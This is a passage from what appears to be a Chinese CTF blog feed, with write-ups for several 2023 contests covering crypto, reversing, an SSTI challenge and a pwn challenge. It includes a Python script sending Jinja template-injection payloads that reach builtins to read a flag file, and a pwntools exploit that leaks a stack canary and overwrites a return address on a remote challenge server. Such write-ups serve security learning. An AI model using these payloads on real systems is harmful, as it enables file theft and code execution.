</p><p>N17EHf1DWHD40DWH/f79E05EfIH1E179E1</p><p>2e95a5c5f9643df668d3965a6cdf19541bc0496b</p><p>发现了主要将函数call</p><p>好熟悉的函数，</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps7.jpg" alt="img"> </p><p>查MSCN</p><p><a href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id">ALG_ID (Wincrypt.h) - Win32 apps | Microsoft Learn</a></p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps8.jpg" alt="img"> </p><p>结合上面的字符串</p><p>2e95a5c5f9643df668d3965a6cdf19541bc0496b</p><p>解密，得到</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps9.jpg" alt="img"> </p><p>6c324d2c86a72b864a22f30e46d20220</p><p>提交，正确</p><p>flag{6c324d2c86a72b864a22f30e46d20220}</p><h1 id="find-me-and-crack-me-md5-x2F-DES"><a href="#find-me-and-crack-me-md5-x2F-DES" class="headerlink" title="find me and crack me - md5/DES"></a>find me and crack me - md5/DES</h1><ul><li>md5</li><li>DES/ECB key=PKcs7</li></ul><p>右键看源代码</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps10.jpg" alt="img"> </p><p>key先base64后md5</p><p>enc  base64</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps11.jpg" alt="img"> </p><p>DES ECB解密 key是PKcs7</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps12.jpg" alt="img"> </p><p> 这儿因为时间戳生成密钥有时间限制，</p><p>要么手速快一点，要么写个脚本无缝请求到</p><p>像我这样手残+nao残选择</p><p>丢给GPT写个自动脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web-909b263e7b.challenge.xctf.org.cn/"</span></span><br><span class="line">url1 = <span class="string">"http://web-909b263e7b.challenge.xctf.org.cn//mimic_storage"</span></span><br><span class="line">url2 = <span class="string">"http://web-909b263e7b.challenge.xctf.org.cn//getflag?sec={}&amp;path=MVhuOtClaoE5899iOuiSWkvqxsrRimmb"</span></span><br><span class="line">a = get(url1)</span><br><span class="line">res = re.findall(<span class="string">"[0-9]*"</span>, a.text)</span><br><span class="line">num = (res[-<span class="number">3</span>])</span><br><span class="line">b = get(url2.<span class="built_in">format</span>(num))</span><br><span class="line"><span class="built_in">print</span>(b.text)</span><br></pre></td></tr></tbody></table></figure><p>flag{bWltaWMtQ3RmLVd1SmlhbmdYaW5n}</p><h1 id="用户鉴权-json"><a href="#用户鉴权-json" class="headerlink" title="用户鉴权 - json"></a>用户鉴权 - json</h1><ul><li>听人劝吃饱饭</li><li>JSON</li></ul><p>第一步 /nudm-ueau</p><p>第二步 </p><p>/nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data</p><p>提示 please try other methods</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps13.jpg" alt="img"> </p><p>使用Burp抓包，改POST请求</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps14.jpg" alt="img"> </p><p>得到这个，根据提示，指定JSON发包</p><p>servingNetworkName is nil,ausfInstanceId is nil</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web-909b263e7b.challenge.xctf.org.cn/"</span></span><br><span class="line">url1 = <span class="string">"http://web-909b263e7b.challenge.xctf.org.cn//mimic_storage"</span></span><br><span class="line">url2 = <span class="string">"http://web-909b263e7b.challenge.xctf.org.cn//getflag?sec={}&amp;path=MVhuOtClaoE5899iOuiSWkvqxsrRimmb"</span></span><br><span class="line">a = get(url1)</span><br><span class="line">res = re.findall(<span class="string">"[0-9]*"</span>, a.text)</span><br><span class="line">num = (res[-<span class="number">3</span>])</span><br><span class="line">b = get(url2.<span class="built_in">format</span>(num))</span><br><span class="line"><span class="built_in">print</span>(b.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>得到</p><p>200</p><p>{“tips”:”now is step2,please to step3:use url /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/ctf-data?flag=XXXX”,”description”:”now you get the rand,rand is 666c61677b3332677364673637396b61647d”,”hints”:”flag is in the rand,base64/4”}</p><p>然后转hex，得到flag</p><p>flag{32gsdg679kad}</p><h1 id="Tbox-Can"><a href="#Tbox-Can" class="headerlink" title="Tbox Can"></a>Tbox Can</h1><ul><li>Can协议分析，十六进制转字符串</li></ul><p>用excel打开can_data.csv</p><p>复制data一整列到cyberchef</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/image-20231113102723398.png" alt="image-20231113102723398"></p><p>将PPASS复制下来，删掉Q，R，S，T后的到L0GIC_ANA1YSIS_CAN_FOR_FUN得到flag</p><p>flag{L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN}</p><h1 id="用户登记系统-ssti-x2F-fenjing"><a href="#用户登记系统-ssti-x2F-fenjing" class="headerlink" title="用户登记系统 - ssti/fenjing"></a>用户登记系统 - ssti/fenjing</h1><ul><li>SSTI</li></ul><p>绕过关键词和字符过滤，逐个数组读出</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://116.63.134.105/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">600</span>):</span><br><span class="line">    postdata = <span class="string">'name={{"".__class__.__base__.__subclasses__()[103].__init__.__globals__.__builtins__["open"]("/tmp/fla""g").read()[%d]}}'</span> % i</span><br><span class="line">    data = {</span><br><span class="line">    <span class="string">"name"</span>:postdata</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    r= requests.post(url,data)</span><br><span class="line">    flag+=r.text[<span class="number">13</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/image-20231113102835160.png" alt="image-20231113102835160"></p><p>输入框输入</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{().class.base.subclasses()[148].init.globals[<span class="string">"buil"</span><span class="string">"tins"</span>].open(<span class="string">"/tmp/fla"</span><span class="string">"g"</span>).<span class="built_in">read</span>().title()}}</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><p>flag{u_win_have_fun}</p><h1 id="拟态控制器-泄露canary"><a href="#拟态控制器-泄露canary" class="headerlink" title="拟态控制器 - 泄露canary"></a>拟态控制器 - 泄露canary</h1><ul><li>保护全开的返回地址爆破</li><li>泄露canary</li></ul><p>先用第一个read泄露%s的canary，再用第二个read填入cnaary后爆破ret返回地址因为只差一字节</p><p>脚本如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">'system'</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b'/bin/sh\x00'</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="comment">#p = process('./controller_pwn')</span></span><br><span class="line">p=remote(<span class="string">"pwn-456459a486.challenge.xctf.org.cn"</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">elf = ELF(<span class="string">'./controller_pwn'</span>)</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x29</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pop=<span class="number">0x943</span></span><br><span class="line">sa(<span class="string">b'command:'</span>,payload)</span><br><span class="line">rl(<span class="string">b'a'</span>*<span class="number">0x29</span>)</span><br><span class="line">canary= u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'ok=&gt;'</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">can = (canary &amp; <span class="number">0xffffffffffffff00</span>) | <span class="number">0x00</span>  <span class="comment"># 将最后四位清零</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'ok=&gt;'</span>+<span class="built_in">hex</span>(can))</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'ok=&gt;'</span>+<span class="built_in">hex</span>(rbp))</span><br><span class="line">payload=<span class="string">b'b'</span>*<span class="number">0x28</span>+p64(can)+<span class="string">b'c'</span>*<span class="number">0x8</span>+<span class="string">b'\n'</span></span><br><span class="line"><span class="comment">#rl(b'c')</span></span><br><span class="line"><span class="comment">#canary = u64(p.recv(7).rjust(8))</span></span><br><span class="line"><span class="comment">#print('canary-&gt;'+hex(canary))</span></span><br><span class="line"><span class="comment">#payload=b'b'*0x28+p64(canary)+</span></span><br><span class="line">s(payload)</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/image-20231113102544263.png" alt="image-20231113102544263"></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023香山杯WriteUp</title>
      <link href="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/"/>
      <url>/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/9fcab875aa6b51bef1b96ce5ade22281-16975149873541.png" alt="img"></p><p>不多说，就一句话，无pwn雪崩</p><h1 id="URL从哪里来"><a href="#URL从哪里来" class="headerlink" title="URL从哪里来"></a>URL从哪里来</h1><p>题目描述说明 程序会生成什么文件</p><p>将程序拖入ida分析</p><p>从伪代码中发现重要字符 ou标识符</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017115903356.png" alt="image-20231017115903356"></p><p>动调 发现程序生成了好多文件，</p><p>ida中可找到有关ou的文件</p><p>路径 C:\Users\86189\AppData\Local\Temp\ou.3BDB.tmp</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017115927111.png" alt="image-20231017115927111"></p><p>该文件拖入010发现其实是PE文件</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017115949429.png" alt="image-20231017115949429"></p><p>将此程序拖入ida分析，动调一会得解</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017120013378.png" alt="image-20231017120013378"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{6469616e-6369-626f-7169-746170617761}</span><br></pre></td></tr></tbody></table></figure><h1 id="hello-py-xxtea"><a href="#hello-py-xxtea" class="headerlink" title="hello_py - xxtea"></a>hello_py - xxtea</h1><p>此题目在2023CISCN华中赛区就用过 — 不过没让我去，太可恶了！</p><p>(ichunqiu重复利用    白嫖 <strong>Mz1</strong> 题目，哈哈哈哈哈) </p><p>jadx分析，Java层</p><p>发现关键标识符 - hello</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017120132809.png" alt="image-20231017120132809"></p><p>题目思路：apk文件解压，翻目录找到了源代码</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017120222583.png" alt="image-20231017120222583"></p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017120228976.png" alt="image-20231017120228976"></p><p>hello.py   —— 题目源代码</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017120240244.png" alt="image-20231017120240244"></p><p>审计代码，发现是xxtea</p><p>编写exp，得解</p><p><img src="/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AFWriteUp/image-20231017120318670.png" alt="image-20231017120318670"></p><p>exp</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cipher[<span class="number">9</span>] = { <span class="number">689085350</span> ,<span class="number">626885696</span> ,<span class="number">1894439255</span> ,<span class="number">1204672445</span> ,<span class="number">1869189675</span> ,<span class="number">475967424</span> ,<span class="number">1932042439</span> ,<span class="number">1280104741</span> ,<span class="number">2808893494</span> };</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = { <span class="number">12345678</span> ,<span class="number">12398712</span> ,<span class="number">91283904</span> ,<span class="number">12378192</span> };</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xxtea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            {</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            }</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        } <span class="keyword">while</span> (--rounds);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    xxtea(cipher, <span class="number">-9</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//printf("0x%x",cipher[i]);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%x,0x%x,0x%x,0x%x,"</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">0</span>) &amp; <span class="number">0xff</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">1</span>) &amp; <span class="number">0xff</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">2</span>) &amp; <span class="number">0xff</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">3</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="type">int</span> Dec[] =</span><br><span class="line">    {</span><br><span class="line">        <span class="number">0x63</span>,<span class="number">0x31</span>,<span class="number">0x66</span>,<span class="number">0x38</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0x2d</span>,<span class="number">0x34</span>,<span class="number">0x62</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x2d</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x2d</span>,<span class="number">0x62</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x62</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x61</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x63</span>,<span class="number">0x35</span>,<span class="number">0x39</span>,<span class="number">0x32</span></span><br><span class="line">    };</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, Dec[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag{c1f8ace6-4b46-4931-b25b-a1010a89c592}</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023羊城杯WriteUp</title>
      <link href="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/"/>
      <url>/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不得不说，本科组真是太卷了，，，，哇哇哇哇哇哇</p><p>最近打的比赛 这下真成取证手了，hhhh</p><p>前蓝帽，陇剑负责取证，这块misc也是做出来了取证，哈哈哈哈</p><p>比赛总共输出2道逆向，2道杂项，题目做着很有手感，(</p><p>但是嘞，das的题目不想多说了</p><p>看题都能看出来是谁出的 (虽然也做不出来</p><h1 id="CSGO-GO-x2F-base64-x2F-反调试"><a href="#CSGO-GO-x2F-base64-x2F-反调试" class="headerlink" title="CSGO - GO/base64/反调试"></a>CSGO - GO/base64/反调试</h1><p>base64,动调出来table表即可得解</p><p>有个反调试，过掉即可</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903105958362.png" alt="image-20230903105958362"></p><p>提取密文</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110029396.png" alt="image-20230903110029396"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>动调</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110242444.png" alt="image-20230903110242444"></p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110252709.png" alt="image-20230903110252709"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table: LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK</span><br><span class="line"></span><br><span class="line">cipher: cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP7WfcPb/URYeMRbesObi/=</span><br><span class="line"></span><br><span class="line">flag：DASCTF{73913519-A0A6-5575-0F10-DDCBF50FA8CA}</span><br></pre></td></tr></tbody></table></figure><h1 id="vm-wo-mac-x2F-vm"><a href="#vm-wo-mac-x2F-vm" class="headerlink" title="vm_wo - mac/vm"></a>vm_wo - mac/vm</h1><p>拿到附件  发现是macos系统文件</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps7.jpg" alt="img"> </p><p>拖入ida64  函数很好看</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps8.jpg" alt="img"> </p><p>main函数，很明了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line"></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"> __int64 i; <span class="comment">// x8</span></span><br><span class="line"></span><br><span class="line"> <span class="type">char</span> __s[<span class="number">16</span>]; <span class="comment">// [xsp+10h] [xbp-E0h] BYREF</span></span><br><span class="line"></span><br><span class="line"> __int128 v6; <span class="comment">// [xsp+20h] [xbp-D0h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v7; <span class="comment">// 